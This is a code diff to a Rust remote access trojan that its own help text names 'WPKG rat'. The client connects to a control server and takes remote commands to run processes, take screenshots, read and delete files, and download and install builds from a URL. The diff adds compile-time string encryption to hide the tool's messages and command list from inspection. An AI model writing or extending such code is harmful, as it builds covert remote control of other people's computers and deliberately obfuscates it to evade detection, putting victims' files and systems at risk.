@@ -8,28 +8,39 @@ use anyhow::anyhow;
 use anyhow::Result;
 use async_recursion::async_recursion;
 use tracing::{error, info};
+use wpkg_crypto::decode;
+use wpkg_macro::encode;
 
 use crate::unwrap::CustomUnwrap;
-use crate::utils;
-use crate::{globals, updater};
+use crate::{crypto, error_crypt, globals, updater};
+use crate::{info_crypt, utils};
 
 #[async_recursion(?Send)]
 pub async fn connect(addr: String) {
     // connect to the ServerD
     match Client::new(addr.clone()) {
         Ok(mut client) => {
-            info!("Connected!");
+            info_crypt!("Connected!");
+
             // reconnect if error
-            if let Err(e) = client.run().await {
-                error!("Unexpected error {}", e);
+            if let Err(err) = client.run().await {
+                error!("Unexpected error {}", err);
+
+                // wait 10 seconds before reconnect
                 thread::sleep(time::Duration::from_secs(10));
+                // reconnect
                 connect(addr).await;
             }
         }
+
         // reconnect to the server
         Err(_e) => {
-            error!("Unable to connect to the server. Reconnecting...");
+            error_crypt!("Unable to connect to the server. Reconnecting...");
+
+            // wait 10 seconds before reconnect
             thread::sleep(time::Duration::from_secs(10));
+
+            // reconnect
             connect(addr).await;
         }
     }
@@ -68,7 +79,7 @@ impl Client {
         // parse buffer into String
         let buf_str = String::from_utf8(recv_buf.to_vec())?;
 
-        info!("[Received]: {}", buf_str);
+        info!("{}: {}", crypto!("[Recived]"), buf_str);
 
         Ok(buf_str)
     }
@@ -94,7 +105,7 @@ impl Client {
 
     /// Send a message to the server
     pub fn send(&mut self, message: &str) -> Result<()> {
-        info!("[Sended]: {}", message);
+        info!("{}: {}", crypto!("[Sended]"), message);
 
         // send message to the server
         self.stream.write_all(message.to_string().as_bytes())?;
@@ -116,7 +127,7 @@ impl Client {
             self.send("Missing arguments")?;
             return Ok(false);
         } else if args.len() < length {
-            self.send("To much arguments")?;
+            self.send("Too much arguments")?;
             return Ok(false);
         }
 
@@ -128,8 +139,8 @@ impl Client {
         let arc_connected = Arc::new(Mutex::new(self.connected));
         let tcp_stream = self.stream.try_clone()?;
 
-        thread::spawn(move || {
-            info!("Starting suspend detecting system...");
+        tokio::spawn(async move {
+            info_crypt!("Starting suspend detecting system...");
 
             while *Arc::clone(&arc_connected).lock().unwrap() {
                 let time: u64 = 1;
@@ -139,7 +150,7 @@ impl Client {
                 let now = before.elapsed().unwrap();
 
                 if now.as_secs() > time {
-                    info!("Suspend detected... Reconnecting...");
+                    info_crypt!("Suspend detected... Reconnecting...");
                     tcp_stream.shutdown(std::net::Shutdown::Both).unwrap_log();
                     return;
                 }
@@ -160,8 +171,6 @@ impl Client {
 
     #[async_recursion]
     pub async fn run(&mut self) -> anyhow::Result<()> {
-        info!("Client started working");
-
         self.suspend_handler()?;
 
         // setup client name
@@ -180,7 +189,7 @@ impl Client {
                 return if self.reconnecting {
                     Ok(())
                 } else {
-                    Err(anyhow!("Client crashed, reconnecting"))
+                    Err(anyhow!(crypto!("Client crashed, reconnecting")))
                 };
             }
 
@@ -191,14 +200,6 @@ impl Client {
             let args = command[1..command.len()].to_vec();
 
             match command[0] {
-                // send message box
-                "msg" => {
-                    if self.check_args(args.clone(), 1)? {
-                        utils::messagebox(args.join(" "));
-                        self.send("Done")?;
-                    }
-                }
-
                 // get system status
                 "stat" => {
                     self.send(&utils::stat())?;
@@ -222,7 +223,9 @@ impl Client {
                             Ok(mut client) => {
                                 info!("Reconnected succesfully to {}:{}!", args[0], args[1]);
 
-                                self.send("Succesfully reconnected client... disconnecting...")?;
+                                self.send(&crypto!(
+                                    "Succesfully reconnected client... disconnecting..."
+                                ))?;
                                 self.send_command("/disconnect")?;
 
                                 self.reconnecting = true;
@@ -232,8 +235,10 @@ impl Client {
                                 client.run().await?;
                             }
                             Err(_e) => {
-                                error!("Error reconnecting to server");
-                                self.send("Error reconnecting to server")?;
+                                let msg = crypto!("Error reconnecting to server");
+
+                                error!(msg);
+                                self.send(&msg)?;
                             }
                         }
                     }
@@ -263,23 +268,26 @@ impl Client {
                                 error!("Updating failed: {err}");
                             }
                         } else {
-                            self.send("WPKG is up to date!")?;
+                            self.send(&crypto!("WPKG is up to date!"))?;
                         }
                     }
                     Err(e) => {
-                        error!("Failed to check updates: {e}");
-                        self.send("Failed to check updates: {e}")?;
+                        let msg = format!("{} {}", crypto!("Failed to check updates"), e);
+
+                        error!("{msg}");
+
+                        self.send(&msg)?;
                     }
                 },
 
                 "dev-update" => {
                     if self.check_args(args.clone(), 1)? {
-                        self.send("Installing developer build... Disconnecting...")?;
+                        self.send(&crypto!("Installing developer build... Disconnecting..."))?;
 
                         self.send("/disconnect")?;
 
                         if let Err(err) = updater::update(args[0]).await {
-                            error!("Updating failed: {err}");
+                            error!("{}: {}", crypto!("Updating failed"), err)
                         }
                     }
                 }
@@ -290,29 +298,30 @@ impl Client {
 
                 // send help message
                 "help" => {
-                    let help = format!(
-                        "{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}",
-                        "msg <message> - showing message\n",
-                        "stat - sending pc stats (CPU, RAM and Swap)\n",
-                        "run <process> <args> - run process\n",
-                        "reconnect <ip> <port> - reconnecting to another ServerD\n",
-                        "screenshot - make screenshot and sending url\n",
-                        "disconnect - disconnecting ServerD Client\n",
-                        "check-updates - Checking updates",
-                        "dev-update <url> - Downloading and installing custom version",
-                        "ping - sending ping\n",
-                        "version - get version of WPKG rat\n",
-                        "help - showing help\n",
-                        "cd <dir> - changing dir",
-                        "pwd - showing directory\n",
-                        "ls - list files in dir\n",
-                        "mkdir <name> - creating folder\n",
-                        "rm <name> - removing file\n",
-                        "cat <name> - reading file"
-                    );
+                    let help = decode(encode!(
+                        "
+stat - sending pc stats (CPU, RAM and Swap)
+run <process> <args> - run process
+reconnect <ip> <port> - reconnecting to another ServerD
+screenshot - make screenshot and sending url
+disconnect - disconnecting ServerD Client
+check-updates - Checking updates
+dev-update <url> - Downloading and installing custom versin
+ping - sending ping
+version - get version of WPKG rat
+help - showing help
+cd <dir> - changing d
+pwd - showing directory
+ls - list files in dir
+mkdir <name> - creating folder
+rm <name> - removing file
+cat <name> - reading file
+"
+                    ));
+
                     self.send(&help)?;
                 }
-                _ => self.send("Unknown command")?,
+                _ => self.send(&crypto!("Unknown command"))?,
             }
         }
 
